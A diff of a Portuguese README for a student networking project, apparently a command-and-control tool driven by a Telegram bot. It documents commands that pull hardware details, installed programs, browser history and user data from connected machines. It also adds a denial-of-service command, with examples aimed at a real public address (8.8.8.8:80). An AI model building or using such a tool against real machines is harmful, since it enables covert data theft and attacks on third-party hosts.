@@ -1,11 +1,11 @@
 #+title: README
 #+author: Sidney Pedro
-#+date: [2024-01-01 Mon]
+#+date: [2024-01-07 Sun]
 
 * Projeto
 Projeto final da disciplina Programação para Redes
 
-** Instruções
+** Objetivos
 Fazer uma aplicação cliente/servidor com as seguintes características:
 - A conexão entre o cliente e o servidor será através de um socket (UDP ou TCP);
 
@@ -62,17 +62,35 @@ Fazer uma aplicação cliente/servidor com as seguintes características:
   #+end_center
 
 ** Documentação
+#+begin_quote
+*Antes de usar*: *certifique-se*, em primeiro lugar, de instalar as dependencias utilizando o comando ~pip install -r requirements.txt~ (pode ser necessário utilizar a opção ~--break-system-packages~ logo após ~...requirements.txt~) e, em segundo lugar, de alterar o endereço ~0.0.0.0~ da linha 33 do arquivo ~constantes.py~ para o endereço IP do servidor, caso contrário, clientes remotos não serão capazes de se conectar ao servidor
+#+end_quote
+
+#+begin_quote
+*Nota*: durante a execução de algum dos programas (cliente ou servidor) *pode haver latência* durante a execução de comandos, devido aos limites do Telegram para bots e/ou conectividade do servidor com a rede
+#+end_quote
+
 *** Tipo de socket
 TCP será utilizado, devido à confiabilidade da entrega de pacotes, fundamental para um adequado comando e controle das máquinas remotas
 
 *** Comandos do C2 (via [[https://t.me/progredes_c2_bot][Telegram - @progredes_c2_bot]])
-| Comando             | Descrição                                                                                                |
-|---------------------+----------------------------------------------------------------------------------------------------------|
-| ~./c2 -h~           | Exibir ajuda (comandos disponíveis, exemplos, etc.)                                                      |
-| ~./c2 -q ID~        | Finaliza o daemon do servidor ou de uma máquina conectada identificada por ~ID~ (o ID do servidor é ~0~) |
-| ~./c2 -d ID~        | Lista informações de hardware de uma máquina conectada identificada por ~ID~                             |
-| ~./c2 -p ID~        | Lista programas instalados em uma máquina conectada identificada por ~ID~                                |
-| ~./c2 -b ID~        | Obtem histórico de navegação dos navegadores de uma máquina conectada identificada por ~ID~              |
-| ~./c2 -u ID~        | Obtem informações do usuário logado de uma máquina conectada identificada por ~ID~                       |
-| ~./c2 -l~           | Lista de máquinas conectadas (ID's, endereços, IP, tempo online, etc.)                                   |
-| ~./c2 -s AÇÃO HOST~ | Reservado                                                                                                |
+| Comando             | Descrição                                                                                                                               |
+|---------------------+-----------------------------------------------------------------------------------------------------------------------------------------|
+| ~./c2 -h~           | Exibir ajuda (comandos disponíveis, exemplos de uso, etc.)                                                                              |
+| ~./c2 -q ID~        | Finaliza o daemon do servidor ou de uma máquina conectada identificada por ~ID~ (o ID do servidor é ~0~)                                |
+| ~./c2 -d ID~        | Lista informações de hardware de uma máquina conectada identificada por ~ID~                                                            |
+| ~./c2 -p ID~        | Lista programas instalados em uma máquina conectada identificada por ~ID~ (essa ação pode levar alguns minutos até ser concluída)       |
+| ~./c2 -b ID~        | Obtém os últimos 200 itens do histórico de navegação dos navegadores de uma máquina conectada identificada por ~ID~                     |
+| ~./c2 -u ID~        | Obtém informações do usuário logado de uma máquina conectada identificada por ~ID~                                                      |
+| ~./c2 -l~           | Lista de máquinas conectadas (ID's, endereços, IP, tempo online, etc.)                                                                  |
+| ~./c2 -n AÇÃO SOCK~ | Realiza Negação de Serviço (leia os exemplos de uso abaixo). Valores válidos para ~AÇÃO~ são ~iniciar~ e ~parar~. O argumento ~SOCK~ deve seguir o formato ~IP:PORTA~ |
+
+*** Exemplos de uso do C2 (via [[https://t.me/progredes_c2_bot][Telegram - @progredes_c2_bot]])
+| Comando                      | Descrição                                                             |
+|------------------------------+-----------------------------------------------------------------------|
+| ~./c2 -h~                    | Solicitando instruções de uso do C2                                   |
+| ~./c2 -q 0~                  | Finaliza o servidor                                                   |
+| ~./c2 -q 4~                  | Finaliza o cliente ~4~                                                |
+| ~./c2 -b 1~                  | Obtendo os últimos 200 itens do histórico de navegação do cliente ~1~ |
+| ~./c2 -n iniciar 8.8.8.8:80~ | Iniciando Negação de Serviço contra a porta ~80~ da máquina ~8.8.8.8~ |
+| ~./c2 -n parar 8.8.8.8:80~   | Parando Negação de Serviço contra a porta ~80~ da máquina ~8.8.8.8~   |
